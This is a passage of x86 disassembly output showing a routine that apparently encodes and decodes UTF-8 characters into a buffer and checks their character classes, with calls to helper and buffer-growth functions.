  401cce:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401cd5:	ff 75 e0             	push   -0x20(%ebp)
  401cd8:	e8 e3 3f 00 00       	call   0x405cc0
  401cdd:	83 c4 04             	add    $0x4,%esp
  401ce0:	8b 75 0c             	mov    0xc(%ebp),%esi
  401ce3:	8b 7d d0             	mov    -0x30(%ebp),%edi
  401ce6:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  401ce9:	84 c0                	test   %al,%al
  401ceb:	b7 83                	mov    $0x83,%bh
  401ced:	0f 84 dd fe ff ff    	je     0x401bd0
  401cf3:	b9 00 00 11 00       	mov    $0x110000,%ecx
  401cf8:	eb 07                	jmp    0x401d01
  401cfa:	89 fa                	mov    %edi,%edx
  401cfc:	89 f7                	mov    %esi,%edi
  401cfe:	8b 75 0c             	mov    0xc(%ebp),%esi
  401d01:	31 c0                	xor    %eax,%eax
  401d03:	e9 cd fe ff ff       	jmp    0x401bd5
  401d08:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  401d0e:	0f 83 02 02 00 00    	jae    0x401f16
  401d14:	83 e1 5f             	and    $0x5f,%ecx
  401d17:	83 c1 bf             	add    $0xffffffbf,%ecx
  401d1a:	83 f9 1a             	cmp    $0x1a,%ecx
  401d1d:	0f 82 1f 02 00 00    	jb     0x401f42
  401d23:	e9 7b 04 00 00       	jmp    0x4021a3
  401d28:	80 e2 3f             	and    $0x3f,%dl
  401d2b:	89 c3                	mov    %eax,%ebx
  401d2d:	80 ca 80             	or     $0x80,%dl
  401d30:	c1 eb 0c             	shr    $0xc,%ebx
  401d33:	3d ff ff 00 00       	cmp    $0xffff,%eax
  401d38:	0f 87 25 02 00 00    	ja     0x401f63
  401d3e:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401d41:	80 cb e0             	or     $0xe0,%bl
  401d44:	88 1c 06             	mov    %bl,(%esi,%eax,1)
  401d47:	88 54 06 01          	mov    %dl,0x1(%esi,%eax,1)
  401d4b:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  401d4f:	e9 2c 02 00 00       	jmp    0x401f80
  401d54:	c1 ea 12             	shr    $0x12,%edx
  401d57:	80 e3 3f             	and    $0x3f,%bl
  401d5a:	80 ca f0             	or     $0xf0,%dl
  401d5d:	80 cb 80             	or     $0x80,%bl
  401d60:	88 14 3e             	mov    %dl,(%esi,%edi,1)
  401d63:	88 5c 3e 01          	mov    %bl,0x1(%esi,%edi,1)
  401d67:	88 44 3e 02          	mov    %al,0x2(%esi,%edi,1)
  401d6b:	88 4c 3e 03          	mov    %cl,0x3(%esi,%edi,1)
  401d6f:	8b 7d dc             	mov    -0x24(%ebp),%edi
  401d72:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401d75:	8b 5d cc             	mov    -0x34(%ebp),%ebx
  401d78:	8b 45 d0             	mov    -0x30(%ebp),%eax
  401d7b:	01 f9                	add    %edi,%ecx
  401d7d:	ba 01 00 00 00       	mov    $0x1,%edx
  401d82:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401d85:	81 fb 80 00 00 00    	cmp    $0x80,%ebx
  401d8b:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401d8e:	72 1b                	jb     0x401dab
  401d90:	ba 02 00 00 00       	mov    $0x2,%edx
  401d95:	81 fb 00 08 00 00    	cmp    $0x800,%ebx
  401d9b:	72 0e                	jb     0x401dab
  401d9d:	81 fb 00 00 01 00    	cmp    $0x10000,%ebx
  401da3:	ba 04 00 00 00       	mov    $0x4,%edx
  401da8:	83 da 00             	sbb    $0x0,%edx
  401dab:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401dae:	89 55 d8             	mov    %edx,-0x28(%ebp)
  401db1:	89 cf                	mov    %ecx,%edi
  401db3:	29 c8                	sub    %ecx,%eax
  401db5:	39 c2                	cmp    %eax,%edx
  401db7:	8b 55 c8             	mov    -0x38(%ebp),%edx
  401dba:	0f 87 85 04 00 00    	ja     0x402245
  401dc0:	8b 75 c0             	mov    -0x40(%ebp),%esi
  401dc3:	81 fb 80 00 00 00    	cmp    $0x80,%ebx
  401dc9:	73 08                	jae    0x401dd3
  401dcb:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  401dce:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  401dd1:	eb 68                	jmp    0x401e3b
  401dd3:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401dd6:	89 d9                	mov    %ebx,%ecx
  401dd8:	89 da                	mov    %ebx,%edx
  401dda:	80 e1 3f             	and    $0x3f,%cl
  401ddd:	c1 ea 06             	shr    $0x6,%edx
  401de0:	80 c9 80             	or     $0x80,%cl
  401de3:	81 fb 00 08 00 00    	cmp    $0x800,%ebx
  401de9:	73 0c                	jae    0x401df7
  401deb:	80 ca c0             	or     $0xc0,%dl
  401dee:	88 14 3e             	mov    %dl,(%esi,%edi,1)
  401df1:	88 4c 3e 01          	mov    %cl,0x1(%esi,%edi,1)
  401df5:	eb 3b                	jmp    0x401e32
  401df7:	80 e2 3f             	and    $0x3f,%dl
  401dfa:	89 d8                	mov    %ebx,%eax
  401dfc:	80 ca 80             	or     $0x80,%dl
  401dff:	c1 e8 0c             	shr    $0xc,%eax
  401e02:	81 fb ff ff 00 00    	cmp    $0xffff,%ebx
  401e08:	77 0f                	ja     0x401e19
  401e0a:	0c e0                	or     $0xe0,%al
  401e0c:	88 04 3e             	mov    %al,(%esi,%edi,1)
  401e0f:	88 54 3e 01          	mov    %dl,0x1(%esi,%edi,1)
  401e13:	88 4c 3e 02          	mov    %cl,0x2(%esi,%edi,1)
  401e17:	eb 19                	jmp    0x401e32
  401e19:	c1 eb 12             	shr    $0x12,%ebx
  401e1c:	24 3f                	and    $0x3f,%al
  401e1e:	80 cb f0             	or     $0xf0,%bl
  401e21:	0c 80                	or     $0x80,%al
  401e23:	88 1c 3e             	mov    %bl,(%esi,%edi,1)
  401e26:	88 44 3e 01          	mov    %al,0x1(%esi,%edi,1)
  401e2a:	88 54 3e 02          	mov    %dl,0x2(%esi,%edi,1)
  401e2e:	88 4c 3e 03          	mov    %cl,0x3(%esi,%edi,1)
  401e32:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  401e35:	8b 55 c8             	mov    -0x38(%ebp),%edx
  401e38:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401e3b:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401e3e:	8b 7d d0             	mov    -0x30(%ebp),%edi
  401e41:	89 75 e0             	mov    %esi,-0x20(%ebp)
  401e44:	01 c8                	add    %ecx,%eax
  401e46:	b9 01 00 00 00       	mov    $0x1,%ecx
  401e4b:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  401e51:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401e54:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401e57:	72 1b                	jb     0x401e74
  401e59:	b9 02 00 00 00       	mov    $0x2,%ecx
  401e5e:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  401e64:	72 0e                	jb     0x401e74
  401e66:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  401e6c:	b9 04 00 00 00       	mov    $0x4,%ecx
  401e71:	83 d9 00             	sbb    $0x0,%ecx
  401e74:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401e77:	8b 75 d8             	mov    -0x28(%ebp),%esi
  401e7a:	29 f0                	sub    %esi,%eax
  401e7c:	39 c1                	cmp    %eax,%ecx
  401e7e:	89 f0                	mov    %esi,%eax
  401e80:	8b 75 e0             	mov    -0x20(%ebp),%esi
  401e83:	0f 87 e0 03 00 00    	ja     0x402269
  401e89:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  401e8f:	0f 82 93 fa ff ff    	jb     0x401928
  401e95:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  401e98:	89 d1                	mov    %edx,%ecx
  401e9a:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401e9d:	89 d0                	mov    %edx,%eax
  401e9f:	c1 ea 06             	shr    $0x6,%edx
  401ea2:	80 e1 3f             	and    $0x3f,%cl
  401ea5:	80 c9 80             	or     $0x80,%cl
  401ea8:	3d 00 08 00 00       	cmp    $0x800,%eax
  401ead:	73 08                	jae    0x401eb7
  401eaf:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401eb2:	e9 3b 04 00 00       	jmp    0x4022f2
  401eb7:	80 e2 3f             	and    $0x3f,%dl
  401eba:	89 c3                	mov    %eax,%ebx
  401ebc:	80 ca 80             	or     $0x80,%dl
  401ebf:	c1 eb 0c             	shr    $0xc,%ebx
  401ec2:	3d ff ff 00 00       	cmp    $0xffff,%eax
  401ec7:	77 13                	ja     0x401edc
  401ec9:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401ecc:	80 cb e0             	or     $0xe0,%bl
  401ecf:	88 1c 06             	mov    %bl,(%esi,%eax,1)
  401ed2:	88 54 06 01          	mov    %dl,0x1(%esi,%eax,1)
  401ed6:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  401eda:	eb 2f                	jmp    0x401f0b
  401edc:	89 75 e0             	mov    %esi,-0x20(%ebp)
  401edf:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  401ee2:	8b 75 cc             	mov    -0x34(%ebp),%esi
  401ee5:	c1 e8 12             	shr    $0x12,%eax
  401ee8:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  401eeb:	0c f0                	or     $0xf0,%al
  401eed:	88 04 33             	mov    %al,(%ebx,%esi,1)
  401ef0:	8b 45 c8             	mov    -0x38(%ebp),%eax
  401ef3:	8b 75 e0             	mov    -0x20(%ebp),%esi
  401ef6:	24 3f                	and    $0x3f,%al
  401ef8:	0c 80                	or     $0x80,%al
  401efa:	89 c3                	mov    %eax,%ebx
  401efc:	8b 45 cc             	mov    -0x34(%ebp),%eax
  401eff:	88 5c 06 01          	mov    %bl,0x1(%esi,%eax,1)
  401f03:	88 54 06 02          	mov    %dl,0x2(%esi,%eax,1)
  401f07:	88 4c 06 03          	mov    %cl,0x3(%esi,%eax,1)
  401f0b:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401f0e:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  401f11:	e9 15 fa ff ff       	jmp    0x40192b
  401f16:	81 f9 a9 00 00 00    	cmp    $0xa9,%ecx
  401f1c:	0f 86 81 02 00 00    	jbe    0x4021a3
  401f22:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  401f29:	51                   	push   %ecx
  401f2a:	e8 71 3f 00 00       	call   0x405ea0
  401f2f:	83 c4 04             	add    $0x4,%esp
  401f32:	8b 75 0c             	mov    0xc(%ebp),%esi
  401f35:	8b 7d d0             	mov    -0x30(%ebp),%edi
  401f38:	84 c0                	test   %al,%al
  401f3a:	b7 83                	mov    $0x83,%bh
  401f3c:	0f 84 61 02 00 00    	je     0x4021a3
  401f42:	83 c7 02             	add    $0x2,%edi
  401f45:	0f 84 24 01 00 00    	je     0x40206f
  401f4b:	3b 7d 10             	cmp    0x10(%ebp),%edi
  401f4e:	0f 83 15 01 00 00    	jae    0x402069
  401f54:	80 3c 3e c0          	cmpb   $0xc0,(%esi,%edi,1)
  401f58:	0f 8d 11 01 00 00    	jge    0x40206f
  401f5e:	e9 c1 04 00 00       	jmp    0x402424
  401f63:	8b 7d c8             	mov    -0x38(%ebp),%edi
  401f66:	c1 e8 12             	shr    $0x12,%eax
  401f69:	80 e3 3f             	and    $0x3f,%bl
  401f6c:	0c f0                	or     $0xf0,%al
  401f6e:	80 cb 80             	or     $0x80,%bl
  401f71:	88 04 3e             	mov    %al,(%esi,%edi,1)
  401f74:	88 5c 3e 01          	mov    %bl,0x1(%esi,%edi,1)
  401f78:	88 54 3e 02          	mov    %dl,0x2(%esi,%edi,1)
  401f7c:	88 4c 3e 03          	mov    %cl,0x3(%esi,%edi,1)
  401f80:	8b 7d dc             	mov    -0x24(%ebp),%edi
  401f83:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  401f86:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  401f89:	8b 55 cc             	mov    -0x34(%ebp),%edx
  401f8c:	01 f9                	add    %edi,%ecx
  401f8e:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401f91:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  401f94:	b9 01 00 00 00       	mov    $0x1,%ecx
  401f99:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  401f9f:	72 1b                	jb     0x401fbc
  401fa1:	b9 02 00 00 00       	mov    $0x2,%ecx
  401fa6:	81 fa 00 08 00 00    	cmp    $0x800,%edx
  401fac:	72 0e                	jb     0x401fbc
  401fae:	81 fa 00 00 01 00    	cmp    $0x10000,%edx
  401fb4:	b9 04 00 00 00       	mov    $0x4,%ecx
  401fb9:	83 d9 00             	sbb    $0x0,%ecx
  401fbc:	8b 45 bc             	mov    -0x44(%ebp),%eax
  401fbf:	8b 75 e0             	mov    -0x20(%ebp),%esi
  401fc2:	8b 7d d0             	mov    -0x30(%ebp),%edi
  401fc5:	29 f0                	sub    %esi,%eax
  401fc7:	39 c1                	cmp    %eax,%ecx
  401fc9:	89 f0                	mov    %esi,%eax
  401fcb:	0f 87 b6 03 00 00    	ja     0x402387
  401fd1:	8b 75 c0             	mov    -0x40(%ebp),%esi
  401fd4:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  401fda:	73 05                	jae    0x401fe1
  401fdc:	88 14 06             	mov    %dl,(%esi,%eax,1)
  401fdf:	eb 7d                	jmp    0x40205e
  401fe1:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  401fe4:	89 d1                	mov    %edx,%ecx
  401fe6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  401fe9:	89 d0                	mov    %edx,%eax
  401feb:	c1 ea 06             	shr    $0x6,%edx
  401fee:	80 e1 3f             	and    $0x3f,%cl
  401ff1:	80 c9 80             	or     $0x80,%cl
  401ff4:	3d 00 08 00 00       	cmp    $0x800,%eax
  401ff9:	73 12                	jae    0x40200d
  401ffb:	8b 45 d8             	mov    -0x28(%ebp),%eax
  401ffe:	80 ca c0             	or     $0xc0,%dl
  402001:	88 14 06             	mov    %dl,(%esi,%eax,1)
  402004:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  402008:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40200b:	eb 51                	jmp    0x40205e
  40200d:	80 e2 3f             	and    $0x3f,%dl
  402010:	89 c3                	mov    %eax,%ebx
  402012:	80 ca 80             	or     $0x80,%dl
  402015:	c1 eb 0c             	shr    $0xc,%ebx
  402018:	3d ff ff 00 00       	cmp    $0xffff,%eax
  40201d:	77 13                	ja     0x402032
  40201f:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402022:	80 cb e0             	or     $0xe0,%bl
  402025:	88 1c 06             	mov    %bl,(%esi,%eax,1)
  402028:	88 54 06 01          	mov    %dl,0x1(%esi,%eax,1)
  40202c:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  402030:	eb 26                	jmp    0x402058
  402032:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  402035:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  402038:	c1 e8 12             	shr    $0x12,%eax
  40203b:	0c f0                	or     $0xf0,%al
  40203d:	88 04 1e             	mov    %al,(%esi,%ebx,1)
  402040:	8b 45 cc             	mov    -0x34(%ebp),%eax
  402043:	24 3f                	and    $0x3f,%al
  402045:	0c 80                	or     $0x80,%al
  402047:	89 c3                	mov    %eax,%ebx
  402049:	8b 45 d8             	mov    -0x28(%ebp),%eax
  40204c:	88 5c 06 01          	mov    %bl,0x1(%esi,%eax,1)
  402050:	88 54 06 02          	mov    %dl,0x2(%esi,%eax,1)
  402054:	88 4c 06 03          	mov    %cl,0x3(%esi,%eax,1)
  402058:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40205b:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  40205e:	03 4d e0             	add    -0x20(%ebp),%ecx
  402061:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  402064:	e9 c8 f8 ff ff       	jmp    0x401931
  402069:	0f 85 b5 03 00 00    	jne    0x402424
  40206f:	01 f7                	add    %esi,%edi
  402071:	31 c0                	xor    %eax,%eax
  402073:	eb 1b                	jmp    0x402090
  402075:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%eax,%eax,1)
  40207c:	00 00 00 
  40207f:	90                   	nop
  402080:	b0 01                	mov    $0x1,%al
  402082:	89 f1                	mov    %esi,%ecx
  402084:	81 f9 00 00 11 00    	cmp    $0x110000,%ecx
  40208a:	0f 85 42 01 00 00    	jne    0x4021d2
  402090:	3b 7d a8             	cmp    -0x58(%ebp),%edi
  402093:	b7 82                	mov    $0x82,%bh
  402095:	0f 84 08 01 00 00    	je     0x4021a3
  40209b:	8a 1f                	mov    (%edi),%bl
  40209d:	0f b6 cb             	movzbl %bl,%ecx
  4020a0:	84 db                	test   %bl,%bl
  4020a2:	78 0c                	js     0x4020b0
  4020a4:	47                   	inc    %edi
  4020a5:	eb 5e                	jmp    0x402105
  4020a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%eax,%eax,1)
  4020ae:	00 00 
  4020b0:	0f b6 77 01          	movzbl 0x1(%edi),%esi
  4020b4:	83 e1 1f             	and    $0x1f,%ecx
  4020b7:	83 e6 3f             	and    $0x3f,%esi
  4020ba:	80 fb df             	cmp    $0xdf,%bl
  4020bd:	76 3e                	jbe    0x4020fd
  4020bf:	0f b6 57 02          	movzbl 0x2(%edi),%edx
  4020c3:	c1 e6 06             	shl    $0x6,%esi
  4020c6:	83 e2 3f             	and    $0x3f,%edx
  4020c9:	09 f2                	or     %esi,%edx
  4020cb:	80 fb f0             	cmp    $0xf0,%bl
  4020ce:	0f 82 b8 00 00 00    	jb     0x40218c
  4020d4:	0f b6 77 03          	movzbl 0x3(%edi),%esi
  4020d8:	83 e1 07             	and    $0x7,%ecx
  4020db:	c1 e2 06             	shl    $0x6,%edx
  4020de:	c1 e1 12             	shl    $0x12,%ecx
  4020e1:	83 e6 3f             	and    $0x3f,%esi
  4020e4:	09 d6                	or     %edx,%esi
  4020e6:	09 ce                	or     %ecx,%esi
  4020e8:	81 fe 00 00 11 00    	cmp    $0x110000,%esi
  4020ee:	0f 84 af 00 00 00    	je     0x4021a3
  4020f4:	83 c7 04             	add    $0x4,%edi
  4020f7:	a8 01                	test   $0x1,%al
  4020f9:	75 85                	jne    0x402080
  4020fb:	eb 12                	jmp    0x40210f
  4020fd:	c1 e1 06             	shl    $0x6,%ecx
  402100:	83 c7 02             	add    $0x2,%edi
  402103:	09 f1                	or     %esi,%ecx
  402105:	89 ce                	mov    %ecx,%esi
  402107:	a8 01                	test   $0x1,%al
  402109:	0f 85 71 ff ff ff    	jne    0x402080
  40210f:	81 fe 80 00 00 00    	cmp    $0x80,%esi
  402115:	73 39                	jae    0x402150
  402117:	8d 56 d9             	lea    -0x27(%esi),%edx
  40211a:	31 c0                	xor    %eax,%eax
  40211c:	b9 00 00 11 00       	mov    $0x110000,%ecx
  402121:	83 fa 13             	cmp    $0x13,%edx
  402124:	77 0e                	ja     0x402134
  402126:	bb 81 00 08 00       	mov    $0x80081,%ebx
  40212b:	0f a3 d3             	bt     %edx,%ebx
  40212e:	0f 82 50 ff ff ff    	jb     0x402084
  402134:	83 fe 5e             	cmp    $0x5e,%esi
  402137:	0f 84 47 ff ff ff    	je     0x402084
  40213d:	83 fe 60             	cmp    $0x60,%esi
  402140:	0f 85 3a ff ff ff    	jne    0x402080
  402146:	e9 39 ff ff ff       	jmp    0x402084
  40214b:	0f 1f 44 00 00       	nopl   0x0(%eax,%eax,1)
  402150:	81 fe a7 00 00 00    	cmp    $0xa7,%esi
  402156:	0f 86 24 ff ff ff    	jbe    0x402080
  40215c:	89 7d d0             	mov    %edi,-0x30(%ebp)
  40215f:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  402166:	89 75 e0             	mov    %esi,-0x20(%ebp)
  402169:	56                   	push   %esi
  40216a:	e8 51 3b 00 00       	call   0x405cc0
  40216f:	83 c4 04             	add    $0x4,%esp
  402172:	8b 7d d0             	mov    -0x30(%ebp),%edi
  402175:	8b 75 e0             	mov    -0x20(%ebp),%esi
  402178:	84 c0                	test   %al,%al
  40217a:	0f 84 00 ff ff ff    	je     0x402080
  402180:	b9 00 00 11 00       	mov    $0x110000,%ecx
  402185:	31 c0                	xor    %eax,%eax
  402187:	e9 f8 fe ff ff       	jmp    0x402084
  40218c:	c1 e1 0c             	shl    $0xc,%ecx
  40218f:	83 c7 03             	add    $0x3,%edi
  402192:	09 ca                	or     %ecx,%edx
  402194:	89 d6                	mov    %edx,%esi
  402196:	a8 01                	test   $0x1,%al
  402198:	0f 85 e2 fe ff ff    	jne    0x402080
  40219e:	e9 6c ff ff ff       	jmp    0x40210f
  4021a3:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4021a6:	8b 7d d8             	mov    -0x28(%ebp),%edi
  4021a9:	8b 45 bc             	mov    -0x44(%ebp),%eax
  4021ac:	29 c8                	sub    %ecx,%eax
  4021ae:	83 f8 01             	cmp    $0x1,%eax
  4021b1:	89 c8                	mov    %ecx,%eax
  4021b3:	0f 86 f6 01 00 00    	jbe    0x4023af
  4021b9:	8b 75 c0             	mov    -0x40(%ebp),%esi
  4021bc:	83 c1 02             	add    $0x2,%ecx
  4021bf:	c6 04 06 cf          	movb   $0xcf,(%esi,%eax,1)
  4021c3:	88 7c 06 01          	mov    %bh,0x1(%esi,%eax,1)
  4021c7:	8b 5d cc             	mov    -0x34(%ebp),%ebx
  4021ca:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  4021cd:	e9 5f f7 ff ff       	jmp    0x401931
  4021d2:	8b 7d d8             	mov    -0x28(%ebp),%edi
  4021d5:	81 f9 80 00 00 00    	cmp    $0x80,%ecx
  4021db:	73 12                	jae    0x4021ef
  4021dd:	83 e1 5f             	and    $0x5f,%ecx
  4021e0:	b7 82                	mov    $0x82,%bh
  4021e2:	83 c1 bf             	add    $0xffffffbf,%ecx
  4021e5:	83 f9 1a             	cmp    $0x1a,%ecx
  4021e8:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4021eb:	73 bc                	jae    0x4021a9
  4021ed:	eb 24                	jmp    0x402213
  4021ef:	81 f9 a9 00 00 00    	cmp    $0xa9,%ecx
  4021f5:	76 20                	jbe    0x402217
  4021f7:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4021fe:	51                   	push   %ecx
  4021ff:	e8 9c 3c 00 00       	call   0x405ea0
  402204:	83 c4 04             	add    $0x4,%esp
  402207:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40220a:	8b 7d d8             	mov    -0x28(%ebp),%edi
  40220d:	84 c0                	test   %al,%al
  40220f:	b7 82                	mov    $0x82,%bh
  402211:	74 96                	je     0x4021a9
  402213:	b7 83                	mov    $0x83,%bh
  402215:	eb 92                	jmp    0x4021a9
  402217:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40221a:	b7 82                	mov    $0x82,%bh
  40221c:	eb 8b                	jmp    0x4021a9
  40221e:	89 c8                	mov    %ecx,%eax
  402220:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402223:	89 fa                	mov    %edi,%edx
  402225:	89 45 e0             	mov    %eax,-0x20(%ebp)
  402228:	50                   	push   %eax
  402229:	e8 82 f3 02 00       	call   0x4315b0
  40222e:	83 c4 04             	add    $0x4,%esp
  402231:	8b 75 c0             	mov    -0x40(%ebp),%esi
  402234:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402237:	8b 7d dc             	mov    -0x24(%ebp),%edi
  40223a:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  40223d:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402240:	e9 26 f8 ff ff       	jmp    0x401a6b
  402245:	89 ca                	mov    %ecx,%edx
  402247:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40224a:	89 55 e0             	mov    %edx,-0x20(%ebp)
  40224d:	ff 75 d8             	push   -0x28(%ebp)
  402250:	e8 5b f3 02 00       	call   0x4315b0
  402255:	83 c4 04             	add    $0x4,%esp
  402258:	8b 7d c4             	mov    -0x3c(%ebp),%edi
  40225b:	8b 5d cc             	mov    -0x34(%ebp),%ebx
  40225e:	8b 55 c8             	mov    -0x38(%ebp),%edx
  402261:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  402264:	e9 57 fb ff ff       	jmp    0x401dc0
  402269:	8b 55 d8             	mov    -0x28(%ebp),%edx
  40226c:	89 c8                	mov    %ecx,%eax
  40226e:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402271:	89 45 dc             	mov    %eax,-0x24(%ebp)
  402274:	50                   	push   %eax
  402275:	e8 36 f3 02 00       	call   0x4315b0
  40227a:	83 c4 04             	add    $0x4,%esp
  40227d:	8b 75 c0             	mov    -0x40(%ebp),%esi
  402280:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  402283:	8b 7d d0             	mov    -0x30(%ebp),%edi
  402286:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402289:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  40228c:	8b 55 c8             	mov    -0x38(%ebp),%edx
  40228f:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  402295:	0f 82 8d f6 ff ff    	jb     0x401928
  40229b:	e9 f5 fb ff ff       	jmp    0x401e95
  4022a0:	89 55 e0             	mov    %edx,-0x20(%ebp)
  4022a3:	89 ca                	mov    %ecx,%edx
  4022a5:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  4022a8:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4022ab:	57                   	push   %edi
  4022ac:	e8 ff f2 02 00       	call   0x4315b0
  4022b1:	83 c4 04             	add    $0x4,%esp
  4022b4:	8b 75 c0             	mov    -0x40(%ebp),%esi
  4022b7:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4022ba:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4022bd:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  4022c0:	8b 7d d8             	mov    -0x28(%ebp),%edi
  4022c3:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4022c6:	81 fa 80 00 00 00    	cmp    $0x80,%edx
  4022cc:	0f 82 0a f8 ff ff    	jb     0x401adc
  4022d2:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4022d5:	8b 7d d0             	mov    -0x30(%ebp),%edi
  4022d8:	89 d1                	mov    %edx,%ecx
  4022da:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4022dd:	89 d0                	mov    %edx,%eax
  4022df:	c1 ea 06             	shr    $0x6,%edx
  4022e2:	80 e1 3f             	and    $0x3f,%cl
  4022e5:	80 c9 80             	or     $0x80,%cl
  4022e8:	3d 00 08 00 00       	cmp    $0x800,%eax
  4022ed:	73 15                	jae    0x402304
  4022ef:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4022f2:	80 ca c0             	or     $0xc0,%dl
  4022f5:	88 14 06             	mov    %dl,(%esi,%eax,1)
  4022f8:	88 4c 06 01          	mov    %cl,0x1(%esi,%eax,1)
  4022fc:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4022ff:	e9 27 f6 ff ff       	jmp    0x40192b
  402304:	80 e2 3f             	and    $0x3f,%dl
  402307:	89 c3                	mov    %eax,%ebx
  402309:	80 ca 80             	or     $0x80,%dl
  40230c:	c1 eb 0c             	shr    $0xc,%ebx
  40230f:	3d ff ff 00 00       	cmp    $0xffff,%eax
  402314:	77 13                	ja     0x402329
  402316:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402319:	80 cb e0             	or     $0xe0,%bl
  40231c:	88 1c 06             	mov    %bl,(%esi,%eax,1)
  40231f:	88 54 06 01          	mov    %dl,0x1(%esi,%eax,1)
  402323:	88 4c 06 02          	mov    %cl,0x2(%esi,%eax,1)
  402327:	eb 26                	jmp    0x40234f
  402329:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  40232c:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  40232f:	c1 e8 12             	shr    $0x12,%eax
  402332:	0c f0                	or     $0xf0,%al
  402334:	88 04 1e             	mov    %al,(%esi,%ebx,1)
  402337:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40233a:	24 3f                	and    $0x3f,%al
  40233c:	0c 80                	or     $0x80,%al
  40233e:	89 c3                	mov    %eax,%ebx
  402340:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402343:	88 5c 06 01          	mov    %bl,0x1(%esi,%eax,1)
  402347:	88 54 06 02          	mov    %dl,0x2(%esi,%eax,1)
  40234b:	88 4c 06 03          	mov    %cl,0x3(%esi,%eax,1)
  40234f:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  402352:	8b 5d d4             	mov    -0x2c(%ebp),%ebx
  402355:	03 4d d8             	add    -0x28(%ebp),%ecx
  402358:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  40235b:	e9 d1 f5 ff ff       	jmp    0x401931
  402360:	89 c8                	mov    %ecx,%eax
  402362:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  402365:	89 fa                	mov    %edi,%edx
  402367:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40236a:	50                   	push   %eax
  40236b:	e8 40 f2 02 00       	call   0x4315b0
  402370:	83 c4 04             	add    $0x4,%esp
  402373:	8b 75 c0             	mov    -0x40(%ebp),%esi
  402376:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  402379:	8b 7d dc             	mov    -0x24(%ebp),%edi
